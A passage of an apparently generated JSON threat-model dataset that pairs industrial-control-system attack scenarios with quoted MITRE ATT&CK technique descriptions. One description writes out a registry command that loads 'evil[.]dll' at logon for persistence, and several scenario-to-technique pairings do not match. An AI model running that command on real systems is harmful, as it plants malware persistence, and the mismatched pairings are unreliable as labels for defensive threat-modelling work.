                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in a PLC to gain unauthorized higher-level permissions.",
            "Assumptions": [
                {
                    "Assumption": "The software has unpatched vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "Known vulnerabilities are not patched"
                },
                {
                    "Assumption": "The exploit code can be executed on the PLC",
                    "Role": "Attacker",
                    "Condition": "Exploit execution is feasible"
                },
                {
                    "Assumption": "No runtime protection for the PLC",
                    "Role": "Attacker",
                    "Condition": "Absence of runtime security solutions"
                }
            ],
            "Potential Impact": "Attacker gains control over critical industrial processes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "PLC",
                "permissions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses phishing to obtain MES admin credentials, allowing full control over the system.",
            "Assumptions": [
                {
                    "Assumption": "MES admin credentials are susceptible to phishing",
                    "Role": "Attacker",
                    "Condition": "Insufficient phishing protection"
                },
                {
                    "Assumption": "Credentials allow unrestricted access to MES functions",
                    "Role": "Attacker",
                    "Condition": "High-privilege credentials"
                },
                {
                    "Assumption": "No additional verification for sensitive actions",
                    "Role": "Attacker",
                    "Condition": "Single factor authentication only"
                }
            ],
            "Potential Impact": "Complete control over MES, potential data or workflow manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "phishing",
                "administrative access",
                "MES"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user leverages a misconfigured security policy to access restricted cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Security policies are misconfigured",
                    "Role": "Admin",
                    "Condition": "Misconfigured access control settings"
                },
                {
                    "Assumption": "No regular audits of security policies",
                    "Role": "Admin",
                    "Condition": "Lack of periodic security policy reviews"
                },
                {
                    "Assumption": "Users are not limited by least privilege principle",
                    "Role": "Admin",
                    "Condition": "Overly broad user permissions"
                }
            ],
            "Potential Impact": "Access to sensitive cloud resources unauthorizedly.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "cloud services",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be a legitimate control center operator gaining unauthorized access to the control commands.",
            "Assumptions": [
                {
                    "Assumption": "Authentication methods in the system are insufficient or improperly configured.",
                    "Role": "Attacker",
                    "Condition": "The attacker is able to bypass or exploit weaknesses in the authentication mechanism."
                },
                {
                    "Assumption": "The system's operators do not use secure communication channels.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the network and can intercept or inject data."
                },
                {
                    "Assumption": "There is a lack of multi-factor authentication.",
                    "Role": "System Admin",
                    "Condition": "Multi-factor authentication is not implemented or enforced."
                }
            ],
            "Potential Impact": "Unauthorized changes to operational controls, potentially halting or altering production processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "authentication",
                "network",
                "control system"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a cloud service broker to intercept data streams between the SCADA system and the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient validation of cloud service identities.",
                    "Role": "Attacker",
                    "Condition": "Cloud service identities are not properly verified before establishing connections."
                },
                {
                    "Assumption": "Lack of encrypted communication channels.",
                    "Role": "Attacker",
                    "Condition": "Data streams are not encrypted, or encryption can be bypassed."
                },
                {
                    "Assumption": "Insecure DNS configurations.",
                    "Role": "Attacker",
                    "Condition": "DNS spoofing or manipulation is possible within the network."
                }
            ],
            "Potential Impact": "Interception and potential alteration of sensitive data being transmitted.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "cloud services",
                "data streams",
                "interception"
            ],
            "mitre_technique": {
                "name": "Impersonation",
                "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f \n \nImpersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)",
                "id": "attack-pattern--c9e0c59e-162e-40a4-b8b1-78fab4329ada",
                "technique_id": "T1656"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor impersonates a field device to send false data to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Field devices use weak or no authentication.",
                    "Role": "Attacker",
                    "Condition": "Field devices authenticate weakly, allowing easy impersonation."
                },
                {
                    "Assumption": "Lack of device validation checks by RTUs.",
                    "Role": "System Admin",
                    "Condition": "RTUs do not perform strict validation of device identities."
                },
                {
                    "Assumption": "Open and unsecured network access for field devices.",
                    "Role": "Attacker",
                    "Condition": "The network is accessible and field devices can be reached without proper network segmentation."
                }
            ],
            "Potential Impact": "Transmission of incorrect data, leading to erroneous decisions or system malfunctions.",
            "MITRE ATT&CK Keywords": [
                "device spoofing",
                "RTU",
                "false data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the control commands sent from the control center to the RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Weak or broken encryption methods.",
                    "Role": "Attacker",
                    "Condition": "Encryption methods are weak or can be broken by the attacker."
                },
                {
                    "Assumption": "Insufficient integrity checks.",
                    "Role": "System Admin",
                    "Condition": "Integrity checks are not performed on the data packets."
                },
                {
                    "Assumption": "Network vulnerabilities allowing man-in-the-middle attacks.",
                    "Role": "Attacker",
                    "Condition": "Network is vulnerable to interception."
                }
            ],
            "Potential Impact": "Altered operational commands, potentially causing harmful or undesired actions in the industrial process.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "control commands",
                "RTU",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to the MES database and alters production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate database security measures.",
                    "Role": "Attacker",
                    "Condition": "Database security is weak, allowing unauthorized access."
                },
                {
                    "Assumption": "Exploitable software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Software vulnerabilities exist and can be exploited."
                },
                {
                    "Assumption": "Lack of regular audits and monitoring.",
                    "Role": "System Admin",
                    "Condition": "Database operations are not regularly audited and monitored."
                }
            ],
            "Potential Impact": "Corruption of workflow data, leading to production inefficiencies or errors.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "MES",
                "production workflow",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker amends firmware or software on PLCs to execute unauthorized operations.",
            "Assumptions": [
                {
                    "Assumption": "PLCs are not physically secured.",
                    "Role": "Attacker",
                    "Condition": "Physical access to PLCs can be achieved by the attacker."
                },
                {
                    "Assumption": "Lack of integrity checks for firmware/software.",
                    "Role": "System Admin",
                    "Condition": "Firmware/software is not subject to integrity checks."
                },
                {
                    "Assumption": "Unrestricted access to PLC configuration interfaces.",
                    "Role": "Attacker",
                    "Condition": "Configuration interfaces are accessible without proper security measures."
                }
            ],
            "Potential Impact": "Execution of unauthorized operations, potentially damaging equipment or disrupting processes.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "PLC",
                "software manipulation",
                "unauthorized operations"
            ],
            "mitre_technique": {
                "name": "Change Operating Mode",
                "description": "Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  \n\n* Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  \n* Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   \n* Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    \n* Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   \n* Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   \n* Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron)",
                "id": "attack-pattern--2883c520-7957-46ca-89bd-dab1ad53b601",
                "technique_id": "T0858"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies issuing a particularly harmful command, and no logs exist to verify the action.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate logging practices.",
                    "Role": "System Admin",
                    "Condition": "Logs are not maintained or are incomplete."
                },
                {
                    "Assumption": "Insufficient use of digital signatures.",
                    "Role": "System Admin",
                    "Condition": "Commands are not digitally signed for non-repudiation."
                },
                {
                    "Assumption": "Log tampering or insufficient log protection.",
                    "Role": "Attacker",
                    "Condition": "Logs can be tampered with due to insufficient protection."
                }
            ],
            "Potential Impact": "Difficulty in attributing actions, complicating incident response and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "digital signatures",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A remote user claims they did not alter any settings, but remote access logs are either missing or suspiciously modified.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are either disabled or easily alterable.",
                    "Role": "System Admin",
                    "Condition": "Remote access logs are not robust and can be easily tampered with."
                },
                {
                    "Assumption": "Remote access security mechanisms are weak.",
                    "Role": "Attacker",
                    "Condition": "Remote access can be generated by unauthorized actors."
                },
                {
                    "Assumption": "Absence or weakness of log integrity checks.",
                    "Role": "System Admin",
                    "Condition": "Integrity checks on logs are not performed or are ineffective."
                }
            ],
            "Potential Impact": "Loss of forensic evidence, complicating security incident investigations.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "remote access",
                "repudiation",
                "forensic evidence"
            ],
            "mitre_technique": {
                "name": "Registry Run Keys / Startup Folder",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.\n\nThe startup folder path for the current user is:\n* <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>\nThe startup folder path for all users is:\n* <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                "id": "attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc",
                "technique_id": "T1060"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider claims data was not manipulated during processing, but no audit trail exists to confirm.",
            "Assumptions": [
                {
                    "Assumption": "Poor audit and monitoring practices for cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Audit trails and monitoring are not comprehensive."
                },
                {
                    "Assumption": "Insufficient transparency and verification mechanisms by cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Cloud services do not provide transparent verification of data integrity."
                },
                {
                    "Assumption": "Lack of contractual agreements ensuring proper log management.",
                    "Role": "System Admin",
                    "Condition": "Service Level Agreements do not enforce strict logging and auditing practices."
                }
            ],
            "Potential Impact": "Disputes over data integrity and non-repudiation issues, affecting trust in cloud services.",
            "MITRE ATT&CK Keywords": [
                "audit trail",
                "cloud services",
                "data integrity",
                "dispute"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
